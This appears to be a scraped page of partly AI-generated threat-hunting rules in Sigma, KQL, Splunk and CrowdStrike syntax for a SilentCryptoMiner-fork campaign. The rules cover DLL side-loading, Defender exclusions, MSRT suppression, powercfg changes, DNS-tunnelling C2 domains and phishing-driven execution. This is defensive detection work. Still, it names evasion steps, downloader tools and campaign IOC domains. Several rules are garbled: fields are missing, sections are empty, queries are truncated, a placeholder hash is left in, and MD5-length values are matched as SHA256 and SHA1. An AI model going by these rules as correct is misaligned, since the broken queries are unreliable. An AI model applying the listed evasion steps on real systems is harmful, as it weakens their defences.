title: File or Process Matching Article Hash IOCs
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0b
status: experimental
description: |

    at scale.
references:

author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1027

    category: process_creation
    product: windows

    selection:
        Hashes|contains:
            - 'SHA256=__HASH_PLACEHOLDER_REPLACE_ME__'

falsepositives:

level: critical

[LLM] HLS Installer.874.exe DLL side-load from pirate-streaming ZIP lure Installation High
Hunts the SilentCryptoMiner-fork delivery chain: the bundled legitimate 'HLS Installer.874.exe' executes from a user-downloaded archive and loads a same-directory rogue DLL, which then reflectively maps the encrypted main module. Targets the exact binary name and the user-writable parent folders (Downloads / Temp / Desktop) the lure ZIP unpacks into. Rationale: Anchors on the article's verbatim binary name 'HLS Installer.874.exe' (code block 1) and the user-writable archive-unpack locations where pirated lures land. Defender query joins process-create to image-load on the same PID to confirm side-loading rather than just an executed installer. Cross-checked NTT Security's 'chromium-patch-nightly' lure variant referenced in the article body. Cross-checked against: • https://attack.mitre.org/techniques/T1574/002/ • https://github.com/SilentMine/SilentCryptoMiner
ATT&CKT1574.002 T1204.002
Data sourcesEndpoint.Processes Endpoint.Filesystem
DeviceProcessEvents
| where Timestamp > ago(14d)
| where FileName =~ "HLS Installer.874.exe"
| where FolderPath has_any (@"\Downloads\", @"\Desktop\", @"\Temp\", @"\AppData\Local\Temp\")
| join kind=inner (
    DeviceImageLoadEvents
    | where Timestamp > ago(14d)
    | where InitiatingProcessFileName =~ "HLS Installer.874.exe"
    | where FolderPath has_any (@"\Downloads\", @"\Desktop\", @"\Temp\", @"\AppData\Local\Temp\")
    | where FileName endswith ".dll"
) on DeviceId, $left.ProcessId == $right.InitiatingProcessId
| project Timestamp, DeviceName, AccountName, ProcessFolder=FolderPath, ProcessCmd=ProcessCommandLine, SideLoadedDll=FileName1, DllFolder=FolderPath1, DllSha256=SHA2561
| order by Timestamp desc
let Lookback = 14d;
let ProcEvts = ImProcessCreate
| where TimeGenerated > ago(Lookback)
| where ActingProcessName endswith "HLS Installer.874.exe"
| where ActingProcessName has_any (@"\Downloads\", @"\Desktop\", @"\Temp\", @"\AppData\Local\Temp\");
let DllEvts = ImFileEvent
| where TimeGenerated > ago(Lookback)
| where ActingProcessName endswith "HLS Installer.874.exe"
| where TargetFileName endswith ".dll";
ProcEvts
| join kind=inner (DllEvts) on DvcHostname
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileSHA256
| order by TimeGenerated desc
title: HLS Installer.874.exe Execution From User-Writable Path
id: c93f5b62-3a17-4f4a-9f1d-8c0f47b8ab21
description: Detects execution of the legitimately-signed 'HLS Installer.874.exe' binary used as a DLL side-loading host by the SilentCryptoMiner-fork distributed via pirated streaming and digital-library sites.
references:
  - https://securelist.com/video-books-pirates-miners-rat/119943/
author: SOC Detection Engineering
date: 2026/05/28
tags:
  - attack.t1574.002
  - attack.t1204.002
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\HLS Installer.874.exe'
  paths:
    Image|contains:
      - '\Downloads\'
      - '\Desktop\'
      - '\Temp\'
      - '\AppData\Local\Temp\'
  condition: selection and paths
level: high
source:(windows.sysmon OR windows.security) @EventID:(1 OR 4688) @Image:(*\HLS\ Installer.874.exe OR *\hls\ installer.874.exe OR *\HLS\ INSTALLER.874.EXE) (@Image:*\Downloads\* OR @Image:*\Desktop\* OR @Image:*\Temp\* OR @Image:*\AppData\Local\Temp\*)
#event_simpleName=ProcessRollup2
| ImageFileName=/\\HLS Installer\.874\.exe$/i
| regex("\\\\(Downloads|Desktop|Temp|AppData\\\\Local\\\\Temp)\\\\", field=ImageFileName)
| groupBy([aid, ComputerName, UserName, ImageFileName, CommandLine, SHA256HashData], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=t count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name="HLS Installer.874.exe" (Processes.process_path="*\\Downloads\\*" OR Processes.process_path="*\\Desktop\\*" OR Processes.process_path="*\\Temp\\*" OR Processes.process_path="*\\AppData\\Local\\Temp\\*") by Processes.dest Processes.user Processes.process_path Processes.process Processes.parent_process_name Processes.process_hash | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name="HLS Installer.874.exe" (Processes.process_path="*\\Downloads\\*" OR Processes.process_path="*\\Desktop\\*" OR Processes.process_path="*\\Temp\\*" OR Processes.process_path="*\\AppData\\Local\\Temp\\*") by Processes.dest Processes.user Processes.process_path Processes.process Processes.parent_process_name Processes.process_hash | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
[LLM] SilentCryptoMiner-fork: Defender exclusions added for %USERPROFILE%, %PROGRAMDATA%, %WINDIR%, .exe, .dll Installation High
Detects the privileged preparatory step in the SilentCryptoMiner-fork chain: bulk addition of Defender path AND extension exclusions covering EXE, DLL, and the three root profile directories. The combination is unusual outside MDM / GPO baselines and is the campaign's defense-evasion fingerprint. Rationale: Anchors on the article's exact exclusion targets (.exe, .dll, %USERPROFILE%, %PROGRAMDATA%, %WINDIR%). Requiring >=3 of the five exclusion strings within a 10-min window distinguishes the campaign's bulk-add behaviour from a single legitimate IT exclusion. Cross-checked MITRE T1562.001 and prior SilentCryptoMiner write-ups (Kaspersky 'Undercover miner' post referenced inline in the article). Cross-checked against: • https://attack.mitre.org/techniques/T1562/001/ • https://securelist.com/silentcryptominer-as-restriction-bypass-tool/115960/
ATT&CKT1562.001
Data sourcesEndpoint.Registry Endpoint.Processes
let WindowMins = 10m;
DeviceRegistryEvents
| where Timestamp > ago(7d)
| where ActionType in ("RegistryValueSet", "RegistryKeyCreated")
| where RegistryKey has @"\Microsoft\Windows Defender\Exclusions"
| where RegistryValueName in~ (".exe", ".dll") or RegistryValueName has_any ("%USERPROFILE%", "%PROGRAMDATA%", "%WINDIR%")
| summarize ExclusionCount = dcount(RegistryValueName), Exclusions = make_set(RegistryValueName), Bucket = bin(Timestamp, WindowMins), Actor = any(InitiatingProcessFileName), ActorCmd = any(InitiatingProcessCommandLine) by DeviceId, DeviceName
| where ExclusionCount >= 3
| order by Bucket desc
let WindowMins = 10m;
ImRegistryEvent
| where TimeGenerated > ago(7d)
| where RegistryKey has @"\Microsoft\Windows Defender\Exclusions"
| where RegistryValue in~ (".exe", ".dll") or RegistryValue has_any ("%USERPROFILE%", "%PROGRAMDATA%", "%WINDIR%")
| summarize ExclusionCount = dcount(RegistryValue), Exclusions = make_set(RegistryValue), Bucket = bin(TimeGenerated, WindowMins), Actor = any(ActingProcessName), ActorCmd = any(ActingProcessCommandLine) by DvcHostname
| where ExclusionCount >= 3
| order by Bucket desc
source:(windows.sysmon OR windows.defender) @EventID:13 (@TargetObject:*\Microsoft\Windows\ Defender\Exclusions\Paths\* OR @TargetObject:*\Microsoft\Windows\ Defender\Exclusions\Extensions\*) (@TargetObject:*%USERPROFILE%* OR @TargetObject:*%PROGRAMDATA%* OR @TargetObject:*%WINDIR%* OR @TargetObject:*\.exe OR @TargetObject:*\.dll)
#event_simpleName=AsepValueUpdate
| regex("\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\(Paths|Extensions)", field=RegObjectName)
| (RegValueName=/%USERPROFILE%/i OR RegValueName=/%PROGRAMDATA%/i OR RegValueName=/%WINDIR%/i OR RegValueName=/^\.exe$/i OR RegValueName=/^\.dll$/i)
| groupBy([aid, ComputerName, ContextImageFileName], function=count(field=RegValueName, distinct=true, as=ExclusionCount))
| ExclusionCount >= 3
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=t count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Registry where (Registry.registry_path="*\\Microsoft\\Windows Defender\\Exclusions\\Paths\\*" OR Registry.registry_path="*\\Microsoft\\Windows Defender\\Exclusions\\Extensions\\*") (Registry.registry_value_name="*%USERPROFILE%*" OR Registry.registry_value_name="*%PROGRAMDATA%*" OR Registry.registry_value_name="*%WINDIR%*" OR Registry.registry_value_name=".exe" OR Registry.registry_value_name=".dll") by Registry.dest Registry.user Registry.process_name Registry.registry_path Registry.registry_value_name | `drop_dm_object_name(Registry)` | stats values(registry_value_name) as exclusions dc(registry_value_name) as exclusion_count min(firstTime) as firstTime max(lastTime) as lastTime by dest user process_name | where exclusion_count >= 3
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Registry where (Registry.registry_path="*\\Microsoft\\Windows Defender\\Exclusions\\Paths\\*" OR Registry.registry_path="*\\Microsoft\\Windows Defender\\Exclusions\\Extensions\\*") (Registry.registry_value_name="*%USERPROFILE%*" OR Registry.registry_value_name="*%PROGRAMDATA%*" OR Registry.registry_value_name="*%WINDIR%*" OR Registry.registry_value_name=".exe" OR Registry.registry_value_name=".dll") by Registry.dest Registry.user Registry.process_name Registry.registry_path Registry.registry_value_name | `drop_dm_object_name(Registry)` | stats values(registry_value_name) as exclusions dc(registry_value_name) as exclusion_count min(firstTime) as firstTime max(lastTime) as lastTime by dest user process_name | where exclusion_count >= 3
[LLM] MSRT tampering: HKLM\Software\Policies\Microsoft\MRT DontOfferThroughWUAU = 1 Installation High
Detects the SilentCryptoMiner-fork's MSRT-suppression step: writing the DontOfferThroughWUAU=1 policy value under HKLM\Software\Policies\Microsoft\MRT to block reinstallation, often paired with deletion of %WINDIR%\System32\mrt.exe via ZwSetInformationFile FileDispositionInformation. Rationale: Anchors on the article's exact policy path 'HKLM\Software\Policies\Microsoft\MRT', value name 'DontOfferThroughWUAU', and the data value 1 used to block MSRT reinstall via Windows Update. Pairs the registry write with the article-described mrt.exe deletion under System32 (via ZwSetInformationFile/FileDispositionInformation) for higher fidelity. Cross-checked MITRE T1562.001 mapping. Cross-checked against: • https://attack.mitre.org/techniques/T1562/001/ • https://learn.microsoft.com/en-us/windows/win32/api/ntifs/nf-ntifs-zwsetinformationfile
ATT&CKT1562.001 T1112
Data sourcesEndpoint.Registry Endpoint.Filesystem
let Lookback = 14d;
let RegHit = DeviceRegistryEvents
| where Timestamp > ago(Lookback)
| where ActionType in ("RegistryValueSet", "RegistryKeyCreated")
| where RegistryKey has @"\Software\Policies\Microsoft\MRT"
| where RegistryValueName =~ "DontOfferThroughWUAU"
| where tostring(RegistryValueData) in ("1", "0x1", "0x00000001")
| project Timestamp, DeviceId, DeviceName, AccountName=InitiatingProcessAccountName, Actor=InitiatingProcessFileName, ActorCmd=InitiatingProcessCommandLine, Signal="MRT_PolicyReg";
let FileHit = DeviceFileEvents
| where Timestamp > ago(Lookback)
| where ActionType in ("FileDeleted", "FileRenamed")
| where FolderPath has @"\System32\" and FileName =~ "mrt.exe"
| project Timestamp, DeviceId, DeviceName, AccountName=InitiatingProcessAccountName, Actor=InitiatingProcessFileName, ActorCmd=InitiatingProcessCommandLine, Signal="MRT_FileDelete";
union RegHit, FileHit
| order by Timestamp desc
let Lookback = 14d;
let RegHit = ImRegistryEvent
| where TimeGenerated > ago(Lookback)
| where RegistryKey has @"\Software\Policies\Microsoft\MRT"
| where RegistryValue =~ "DontOfferThroughWUAU"
| where tostring(RegistryValueData) in ("1", "0x1", "0x00000001")
| project TimeGenerated, DvcHostname, ActorUsername, Actor=ActingProcessName, ActorCmd=ActingProcessCommandLine, Signal="MRT_PolicyReg";
let FileHit = ImFileEvent
| where TimeGenerated > ago(Lookback)
| where EventType in ("FileDeleted", "FileRenamed")
| where TargetFilePath has @"\System32\"
| where TargetFileName =~ "mrt.exe"
| project TimeGenerated, DvcHostname, ActorUsername, Actor=ActingProcessName, ActorCmd=ActingProcessCommandLine, Signal="MRT_FileDelete";
union RegHit, FileHit
| order by TimeGenerated desc
title: MSRT Suppression via DontOfferThroughWUAU Policy Key
id: 7b41f02e-25a1-4b3c-b86a-92e0f5f2c5a4
description: Detects creation of the HKLM\Software\Policies\Microsoft\MRT\DontOfferThroughWUAU=1 registry value used by the SilentCryptoMiner-fork distributed via pirated streaming sites to prevent reinstallation of the Microsoft Malicious Software Removal Tool.
references:

author: SOC Detection Engineering

tags:

logsource:

detection:

    TargetObject|contains: '\Software\Policies\Microsoft\MRT\DontOfferThroughWUAU'
    Details:
      - 'DWORD (0x00000001)'
      - '1'
  condition: selection
level: high
source:windows.sysmon @EventID:13 (@TargetObject:*\Software\Policies\Microsoft\MRT\DontOfferThroughWUAU OR @TargetObject:*\SOFTWARE\Policies\Microsoft\MRT\DontOfferThroughWUAU) (@Details:*0x00000001* OR @Details:"DWORD (0x00000001)" OR @Details:1)
#event_simpleName=AsepValueUpdate
| RegObjectName=/\\Software\\Policies\\Microsoft\\MRT/i
| RegValueName=/DontOfferThroughWUAU/i
| RegStringValue=/^(1|0x1|0x00000001)$/i
| groupBy([aid, ComputerName, ContextImageFileName, RegObjectName, RegValueName, RegStringValue], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=t count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Registry where Registry.registry_path="*\\Software\\Policies\\Microsoft\\MRT*" Registry.registry_value_name="DontOfferThroughWUAU" Registry.registry_value_data="0x00000001" by Registry.dest Registry.user Registry.process_name Registry.registry_path Registry.registry_value_name Registry.registry_value_data | `drop_dm_object_name(Registry)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Registry where Registry.registry_path="*\\Software\\Policies\\Microsoft\\MRT*" Registry.registry_value_name="DontOfferThroughWUAU" Registry.registry_value_data="0x00000001" by Registry.dest Registry.user Registry.process_name Registry.registry_path Registry.registry_value_name Registry.registry_value_data | `drop_dm_object_name(Registry)`
[LLM] powercfg sleep/hibernate disable burst (4-command sequence) Installation High
Detects the SilentCryptoMiner-fork's miner-uptime preparation: four powercfg commands disabling hibernate AC, hibernate DC, standby AC, and standby DC in rapid succession. The four-command burst from a single non-administrative parent is the campaign signature distinguishing miners from legitimate power-management tweaks. Rationale: Anchors on the four verbatim powercfg arguments from the article (table 2: hibernate-timeout-ac/dc, standby-timeout-ac/dc, all set to 0). Requiring >=3 distinct variants in a 5-min window separates the miner's burst from a sysadmin tweaking a single setting. The /x form in the article is also alternative-matched. Cross-checked against: • https://attack.mitre.org/techniques/T1496/ • https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/powercfg-command-line-options
ATT&CKT1562.001 T1496
Data sourcesEndpoint.Processes
let WindowMins = 5m;
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName =~ "powercfg.exe"
| where ProcessCommandLine has_any ("-hibernate-timeout-ac 0", "-hibernate-timeout-dc 0", "-standby-timeout-ac 0", "-standby-timeout-dc 0", "/x -hibernate-timeout", "/x -standby-timeout")
| extend Flag = case(
    ProcessCommandLine has "hibernate-timeout-ac", "hib_ac",
    ProcessCommandLine has "hibernate-timeout-dc", "hib_dc",
    ProcessCommandLine has "standby-timeout-ac", "sby_ac",
    ProcessCommandLine has "standby-timeout-dc", "sby_dc",
    "other")
| summarize Variants = dcount(Flag), Cmds = make_set(ProcessCommandLine), Parent = any(InitiatingProcessFileName), ParentCmd = any(InitiatingProcessCommandLine), Bucket = bin(Timestamp, WindowMins) by DeviceId, DeviceName, AccountName
| where Variants >= 3
| order by Bucket desc
let WindowMins = 5m;
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName endswith "powercfg.exe"
| where ActingProcessCommandLine has_any ("-hibernate-timeout-ac 0", "-hibernate-timeout-dc 0", "-standby-timeout-ac 0", "-standby-timeout-dc 0", "/x -hibernate-timeout", "/x -standby-timeout")
| extend Flag = case(
    ActingProcessCommandLine has "hibernate-timeout-ac", "hib_ac",
    ActingProcessCommandLine has "hibernate-timeout-dc", "hib_dc",
    ActingProcessCommandLine has "standby-timeout-ac", "sby_ac",
    ActingProcessCommandLine has "standby-timeout-dc", "sby_dc",
    "other")
| summarize Variants = dcount(Flag), Cmds = make_set(ActingProcessCommandLine), Parent = any(ParentProcessName), ParentCmd = any(ParentProcessCommandLine), Bucket = bin(TimeGenerated, WindowMins) by DvcHostname, ActorUsername
| where Variants >= 3
| order by Bucket desc
source:(windows.sysmon OR windows.security) @EventID:(1 OR 4688) (@Image:*\powercfg.exe OR @Image:*\POWERCFG.EXE) (@CommandLine:*-hibernate-timeout-ac\ 0* OR @CommandLine:*-hibernate-timeout-dc\ 0* OR @CommandLine:*-standby-timeout-ac\ 0* OR @CommandLine:*-standby-timeout-dc\ 0*)
#event_simpleName=ProcessRollup2
| ImageFileName=/\\powercfg\.exe$/i
| regex("-(hibernate|standby)-timeout-(ac|dc)\\s+0", field=CommandLine)
| groupBy([aid, ComputerName, ParentBaseFileName], function=count(field=CommandLine, distinct=true, as=Variants))
| Variants >= 3
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=t count values(Processes.process) as commands min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name="powercfg.exe" (Processes.process="*-hibernate-timeout-ac*0*" OR Processes.process="*-hibernate-timeout-dc*0*" OR Processes.process="*-standby-timeout-ac*0*" OR Processes.process="*-standby-timeout-dc*0*") by Processes.dest Processes.user Processes.parent_process_name Processes.parent_process | `drop_dm_object_name(Processes)` | where count >= 3
| tstats summariesonly=false count values(Processes.process) as commands min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name="powercfg.exe" (Processes.process="*-hibernate-timeout-ac*0*" OR Processes.process="*-hibernate-timeout-dc*0*" OR Processes.process="*-standby-timeout-ac*0*" OR Processes.process="*-standby-timeout-dc*0*") by Processes.dest Processes.user Processes.parent_process_name Processes.parent_process | `drop_dm_object_name(Processes)` | where count >= 3
[LLM] SilentCryptoMiner DNS tunneling to *.microsoft.com lookalike and known C2 .space domains Command & Control High
Hunts the article's specific C2 channel: DNS queries to lookalike domains ending in 'microsoft.com' but resolving to non-Microsoft IPs, plus direct queries to the article's six .space/.online IOC domains. The DNS-tunneled fingerprint payload (CPU info, C: serial, elevation flag, start time) is encoded into a single large subdomain label. Rationale: Anchors on the article's eight IOC domains, the IP 107.172.212.235, and the described DNS-tunneling pattern of long subdomain labels under *.microsoft.com whose A-record resolution falls outside Microsoft's published ranges. The query unions the high-confidence IOC branch with the heuristic tunneling branch so legacy unsubmitted-IP detections and known-IOC detections share one rule. Cross-checked MITRE T1071.004 / T1572 mappings. Cross-checked against: • https://attack.mitre.org/techniques/T1071/004/ • https://attack.mitre.org/techniques/T1572/ • https://learn.microsoft.com/en-us/microsoft-365/enterprise/urls-and-ip-address-ranges
ATT&CKT1071.004 T1572
Data sourcesNetwork_Resolution.DNS Network_Traffic.All_Traffic
let CampaignDomains = dynamic(["urush1bar4.online","file.ipfs.us.69.mu","5d14vnfb.space","r7mvjl67.space","zgj1tam9.space","jeaw520i.space","qdmagva5.space","m4yuri.online"]);
let CampaignIp = "107.172.212.235";
let IocHit = DeviceNetworkEvents
| where Timestamp > ago(14d)
| where (isnotempty(RemoteUrl) and RemoteUrl has_any (CampaignDomains)) or RemoteIP == CampaignIp
| project Timestamp, DeviceId, DeviceName, AccountName=InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, Signal="IOC_Hit";
let TunnelHit = DeviceEvents
| where Timestamp > ago(14d)
| where ActionType == "DnsQueryResponse" or ActionType has "Dns"
| where RemoteUrl endswith ".microsoft.com"
| extend QueryLen = strlen(RemoteUrl)
| where QueryLen > 80
| where not(RemoteIP startswith "13." or RemoteIP startswith "20." or RemoteIP startswith "23." or RemoteIP startswith "40." or RemoteIP startswith "52." or RemoteIP startswith "104." or RemoteIP startswith "131.107." or RemoteIP startswith "134.170." or RemoteIP startswith "137.116." or RemoteIP startswith "157.55." or RemoteIP startswith "168.61." or RemoteIP startswith "191.236." or RemoteIP startswith "207.46.")
| project Timestamp, DeviceId, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, Signal="DNS_Tunnel_MSLookalike";
union IocHit, TunnelHit
| order by Timestamp desc
let CampaignDomains = dynamic(["urush1bar4.online","file.ipfs.us.69.mu","5d14vnfb.space","r7mvjl67.space","zgj1tam9.space","jeaw520i.space","qdmagva5.space","m4yuri.online"]);
let CampaignIp = "107.172.212.235";
let MsRanges = dynamic(["13.","20.","23.","40.","52.","104.","131.107.","134.170.","137.116.","157.55.","168.61.","191.236.","207.46."]);
let IocHit = ImDnsActivity
| where TimeGenerated > ago(14d)
| where DnsQuery has_any (CampaignDomains)
| project TimeGenerated, DvcHostname, SrcUsername, DnsQuery, DstIpAddr, Signal="IOC_Hit";
let TunnelHit = ImDnsActivity
| where TimeGenerated > ago(14d)
| where DnsQuery endswith ".microsoft.com"
| extend QueryLen = strlen(DnsQuery)
| where QueryLen > 80
| extend InMsRange = iff(isnotempty(DstIpAddr) and (DstIpAddr startswith "13." or DstIpAddr startswith "20." or DstIpAddr startswith "23." or DstIpAddr startswith "40." or DstIpAddr startswith "52." or DstIpAddr startswith "104." or DstIpAddr startswith "131.107." or DstIpAddr startswith "134.170." or DstIpAddr startswith "137.116." or DstIpAddr startswith "157.55." or DstIpAddr startswith "168.61." or DstIpAddr startswith "191.236." or DstIpAddr startswith "207.46."), true, false)
| where InMsRange == false
| project TimeGenerated, DvcHostname, SrcUsername, DnsQuery, DstIpAddr, Signal="DNS_Tunnel_MSLookalike";
union IocHit, TunnelHit
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.

Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

DNS tunneling / TXT-heavy domain queries Command & Control Medium
Long subdomain labels + frequent queries to a single 2LD = DNS C2/exfil.
ATT&CKT1071.004 T1048.003
Data sourcesNetwork_Resolution.DNS DeviceNetworkEvents

| where Timestamp > ago(1d)

            by SrcIpAddr, bin(TimeGenerated, 5m)

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df") or SHA1 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df") or MD5 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df") or SHA1 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df") or MD5 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
